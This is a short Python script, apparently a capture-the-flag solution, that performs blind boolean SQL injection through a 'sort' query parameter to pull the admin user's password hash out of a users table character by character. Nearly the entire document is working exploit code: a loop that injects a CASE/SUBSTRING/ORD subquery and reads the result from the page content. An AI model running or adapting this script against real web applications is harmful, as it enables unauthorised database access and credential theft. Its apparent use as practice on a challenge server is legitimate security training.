# sqli to get admin password hash

import requests
import string

URL = "https://typhooncon-knowme.chals.io/items.php?sort="

charset = string.ascii_lowercase + string.digits 

column_name = ['id', 'username', 'password', 'email'] 
hash_pass = ''
for index in range(0,100):
    for i in range(32,128):
        trying = f"(select case when ((select ORD(SUBSTRING(password,{index+1},1)) FROM users WHERE username = 'admin') = {i}) then count else itemName end)"
        print(f"trying: {chr(i)}")
        r = requests.get(URL + trying)
        
        if 'Labtop' in r.text:
            hash_pass += chr(i)
            print(hash_pass)
            break
